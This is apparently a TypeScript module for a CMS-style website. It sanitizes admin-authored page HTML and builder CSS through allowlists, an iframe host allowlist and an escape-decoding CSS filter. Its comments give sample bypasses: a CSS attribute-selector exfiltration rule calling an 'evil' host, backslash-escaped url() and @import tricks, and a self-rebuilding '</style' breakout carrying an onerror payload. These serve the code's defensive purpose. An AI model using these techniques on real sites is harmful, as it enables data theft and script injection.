import "server-only";
import sanitizeHtml from "sanitize-html";

import { isSafeHref } from "./site-content";
import { hasEmbedVideoId } from "./video-embed";

/*
 * Defense-in-depth for content_html (pages/posts/listings), rendered raw via
 * dangerouslySetInnerHTML on public pages. This content is only ever written
 * by the trusted admin operator -- via the WP migration seed or the visual
 * builder in components/editor/HtmlEditor.tsx -- so it is not attacker
 * controlled under normal operation. The point of sanitizing anyway is that
 * if an admin session were ever compromised, a script or event-handler
 * injection would still be stripped before it reached a visitor.
 *
 * The allowlist has to cover what the VISUAL BUILDER emits, not just what the
 * WordPress migration left behind. An earlier version was built only from the
 * migrated content and silently broke every builder-made page: it dropped
 * <section> and <article> (the builder's primary structural blocks) and the
 * <style> block the builder writes all its CSS into, so those pages rendered
 * as unstyled bare text.
 *
 * Two things are deliberately allowed here that a default allowlist would
 * not, each with its own containment:
 *
 *   <iframe>  Only for video embeds, and only from the hosts in
 *             ALLOWED_EMBED_HOSTS. sanitize-html resolves the src and drops
 *             any iframe whose hostname is not on that list, so an admin
 *             cannot embed an arbitrary origin.
 *
 *   <style>   The builder has nowhere else to put a page's CSS. Style blocks
 *             are pulled out and filtered by sanitizeCss() below before the
 *             HTML is sanitized, then reattached -- see that function for
 *             what is removed and why.
 */

const ALLOWED_TAGS = [
  "a", "article", "aside", "br", "button", "div", "figcaption", "figure",
  "h1", "h2", "h3", "h4", "h5", "h6",
  "header", "footer", "hr", "img", "li", "ol", "p", "section", "span",
  "strong", "em", "i", "b", "u", "ul", "blockquote", "table", "thead",
  "tbody", "tr", "th", "td", "iframe", "video", "source",
];

/** Video embed providers the builder may point an <iframe> at. */
const ALLOWED_EMBED_HOSTS = [
  "www.youtube.com",
  "youtube.com",
  "www.youtube-nocookie.com",
  "youtube-nocookie.com",
  "player.vimeo.com",
];

const ALLOWED_ATTRIBUTES: sanitizeHtml.IOptions["allowedAttributes"] = {
  "*": ["class", "id", "style", "title", "aria-hidden", "aria-label", "data-object-fit", "data-start", "data-end"],
  a: ["href", "target", "rel"],
  img: ["src", "alt", "width", "height", "loading"],
  button: ["type"],
  iframe: ["src", "width", "height", "allow", "allowfullscreen", "frameborder", "loading", "referrerpolicy"],
  // A self-hosted clip from the media library. No script surface, and the
  // scheme allowlist still applies to src.
  video: ["src", "width", "height", "controls", "poster", "loop", "muted", "autoplay", "playsinline", "preload"],
  source: ["src", "type"],
  td: ["colspan", "rowspan"],
  th: ["colspan", "rowspan", "scope"],
};

/*
 * Inline `style` attributes stay on a tight allowlist. The <style> BLOCK is
 * filtered separately (sanitizeCss) rather than through this, because a
 * builder-authored stylesheet legitimately uses far more properties than a
 * hand-written inline style ever should.
 */
const ALLOWED_STYLES: sanitizeHtml.IOptions["allowedStyles"] = {
  "*": {
    color: [/^#[0-9a-fA-F]{3,8}$/, /^rgba?\([\d.,\s%]+\)$/, /^[a-zA-Z]+$/],
    "background-color": [/^#[0-9a-fA-F]{3,8}$/, /^rgba?\([\d.,\s%]+\)$/, /^[a-zA-Z]+$/],
    "text-align": [/^left$/, /^right$/, /^center$/, /^justify$/],
    "font-size": [/^\d+(\.\d+)?(px|em|rem|%)$/],
    "font-weight": [/^\d+$/, /^normal$/, /^bold$/],
    "line-height": [/^\d+(\.\d+)?(px|em|rem|%)?$/],
    margin: [/^[-\d.a-z%\s]+$/],
    padding: [/^[\d.a-z%\s]+$/],
    width: [/^\d+(\.\d+)?(px|em|rem|%|vw)$/, /^auto$/],
    "max-width": [/^\d+(\.\d+)?(px|em|rem|%|vw)$/, /^none$/],
    height: [/^\d+(\.\d+)?(px|em|rem|%|vh)$/, /^auto$/],
    "min-height": [/^\d+(\.\d+)?(px|em|rem|%|vh)$/],
    display: [/^(block|inline|inline-block|flex|grid|none)$/],
    "border-radius": [/^[\d.a-z%\s]+$/],
    "grid-template-columns": [/^[\w\d.,()%\s-]+$/],
    gap: [/^[\d.a-z%\s]+$/],
  },
};

const STYLE_BLOCK = /<style\b[^>]*>([\s\S]*?)<\/style>/gi;

/*
 * What gets stripped from a builder stylesheet, and why:
 *
 *   @import          pulls in a remote stylesheet -- an off-origin fetch the
 *                    page author cannot see, and a way to smuggle in rules
 *                    this filter never inspected.
 *   expression()     legacy IE script execution from inside CSS.
 *   behavior:        / -moz-binding: same, via HTC and XBL.
 *   javascript:      a scheme has no business in a stylesheet.
 *   off-origin url() the classic CSS exfiltration channel: a rule like
 *                    input[value^="a"] { background: url(https://evil/?a) }
 *                    leaks page content one request at a time. Relative URLs
 *                    and data: images are kept, since those are what a real
 *                    layout needs.
 *
 * `</style` inside the text would also let an author break out of the block
 * they are in, so it is neutralised.
 */
/*
 * CSS lets any character be written as a backslash escape, and the browser
 * decodes it long after this filter has run. Every pattern below matches
 * literal ASCII, so an escape is a way straight past all of them. Confirmed in
 * a real browser, not deduced:
 *
 *   url(\2f \2f evil.com/x)   -> https://evil.com/x
 *   url(\/\/evil.com/x)       -> https://evil.com/x
 *   @\69 mport url("//e/x")   -> a live CSSImportRule
 *
 * So escapes are decoded before matching. Only escapes that produce a
 * character these patterns actually use are decoded -- letters, digits, and
 * `/ : ( ) @ . -`. Anything else is left exactly as written, because decoding
 * it would change what the CSS means: `content: "\A"` is a newline escape, and
 * turning it into a literal newline inside a string breaks the rule.
 *
 * Decoding can itself produce a new match (`<\2f style` becomes `</ style`),
 * which is the other reason sanitizeCss runs this to a fixed point.
 */
const DECODABLE = /^[A-Za-z0-9/:()@.-]$/;

function decodeSafeCssEscapes(css: string): string {
  return css.replace(/\\(?:([0-9a-fA-F]{1,6})[ \t\n\f]?|([^\r\n\f0-9a-fA-F]))/g, (match, hex, literal) => {
    const char = hex ? String.fromCodePoint(Number.parseInt(hex, 16)) : literal;
    return DECODABLE.test(char) ? char : match;
  });
}

function stripDangerousCss(css: string): string {
  return (
    decodeSafeCssEscapes(css)
      .replace(/@import[^;]*;?/gi, "")
      .replace(/expression\s*\(/gi, "")
      .replace(/behavior\s*:/gi, "")
      .replace(/-moz-binding\s*:/gi, "")
      .replace(/javascript\s*:/gi, "")
      // The whole function goes, not just its scheme: leaving the host behind
      // in a mangled url() keeps the attacker's domain sitting in the page.
      //
      // The closing paren is optional. A url() left unterminated at the end of
      // a stylesheet is a parse error that browsers recover from by using the
      // token anyway -- verified: `url(//example.com/x` with no `)` resolved
      // and fetched. Requiring the `)` here let that straight through.
      .replace(/url\(\s*['"]?\s*(?:https?:)?\/\/[^)]*\)?/gi, "none")
      .replace(/<\/\s*style/gi, "")
  );
}

/**
 * Applied until the output stops changing.
 *
 * A single pass is not enough, because deleting a match can join what sat on
 * either side of it into a NEW match. `<</style/style>` contains `</style` at
 * offset one; removing it leaves `<` joined to `/style>` -- a working closing
 * tag. That tag then ends the <style> element this CSS is reattached inside,
 * and everything after it lands in the page as raw HTML that never went
 * through sanitize-html. Verified before the fix: an `<img src=x onerror=...>`
 * following the payload reached the output with its handler intact.
 *
 * The same reconstruction is possible in principle for the other patterns
 * here, so all of them are looped rather than just the one with a proven
 * payload. The cap is a backstop against a pattern that could somehow grow its
 * input; ten passes is far beyond what any nesting depth needs, and reaching
 * it means giving up on the block entirely rather than emitting something only
 * partly cleaned.
 */
export function sanitizeCss(css: string): string {
  let current = css;
  for (let pass = 0; pass < 10; pass++) {
    const next = stripDangerousCss(current);
    if (next === current) return next;
    current = next;
  }
  return "";
}

export function sanitizeContentHtml(html: string): string {
  // The style blocks are lifted out first: sanitize-html would either drop
  // them wholesale or, if the tag were simply allowed, pass their contents
  // through untouched. Neither is what we want.
  const styles: string[] = [];
  const withoutStyles = html.replace(STYLE_BLOCK, (_match, css: string) => {
    const cleaned = sanitizeCss(css).trim();
    if (cleaned) styles.push(cleaned);
    return "";
  });

  const body = sanitizeHtml(withoutStyles, {
    allowedTags: ALLOWED_TAGS,
    allowedAttributes: ALLOWED_ATTRIBUTES,
    allowedStyles: ALLOWED_STYLES,
    allowedSchemes: ["http", "https", "mailto", "tel"],
    allowedIframeHostnames: ALLOWED_EMBED_HOSTS,
    // An iframe with no src, or a relative one, is not a video embed.
    allowIframeRelativeUrls: false,
    // The hostname check above strips a disallowed `src` but leaves the empty
    // <iframe> element behind, which renders as a blank frame. Anything that
    // lost its src on the way through is dropped outright -- and so is an
    // embed URL that names no video: the builder's Video block emits
    // ".../embed/?" until someone fills in the link, and that host IS on the
    // allowlist, so a block dropped and forgotten shipped a blank player to
    // the live page. No link, no iframe.
    exclusiveFilter: (frame) =>
      frame.tag === "iframe" && (!frame.attribs.src || !hasEmbedVideoId(frame.attribs.src)),
    transformTags: {
      // A target="_blank" link an admin left in place shouldn't give the
      // linked page a handle back to this one via window.opener.
      a: sanitizeHtml.simpleTransform("a", { rel: "noopener noreferrer" }, true),
      // Embeds are third-party frames: deny them the ambient authority a
      // same-origin-ish frame would otherwise inherit.
      iframe: sanitizeHtml.simpleTransform(
        "iframe",
        { loading: "lazy", referrerpolicy: "no-referrer" },
        true
      ),
    },
  });

  return styles.length > 0 ? `<style>${styles.join("\n")}</style>\n${body}` : body;
}

/*
 * Rich text typed on the page itself: the About story, a paragraph under a
 * quote. Far narrower than sanitizeContentHtml on purpose -- paragraphs,
 * line breaks, bold, italic and links, and nothing that could change how the
 * design looks (no classes, no styles, no headings). A browser's editing
 * commands emit <b>, <i> and <div> as readily as <strong>, <em> and <p>, so
 * those are translated rather than lost.
 *
 * A link keeps its href only if isSafeHref accepts it; otherwise the words
 * stay and the link goes. Links off the site open in a new tab without a
 * handle back to this one.
 */
export function sanitizeInlineHtml(html: string): string {
  const cleaned = sanitizeHtml(html, {
    allowedTags: ["p", "br", "strong", "em", "a"],
    allowedAttributes: { a: ["href", "target", "rel"] },
    allowedSchemes: ["http", "https", "mailto", "tel"],
    allowProtocolRelative: false,
    transformTags: {
      b: "strong",
      i: "em",
      div: "p",
      a: (_tagName, attribs): sanitizeHtml.Tag => {
        const href = (attribs.href ?? "").trim();
        // A tag outside the allowlist keeps its text, so this is "unlink".
        if (!isSafeHref(href)) return { tagName: "span", attribs: {} };
        return /^https?:/i.test(href)
          ? { tagName: "a", attribs: { href, target: "_blank", rel: "noopener noreferrer" } }
          : { tagName: "a", attribs: { href } };
      },
    },
  });
  // A paragraph with nothing in it is not content; all of them empty is "".
  return cleaned.replace(/<p>(?:\s|&nbsp;|<br \/>)*<\/p>/g, "").trim();
}
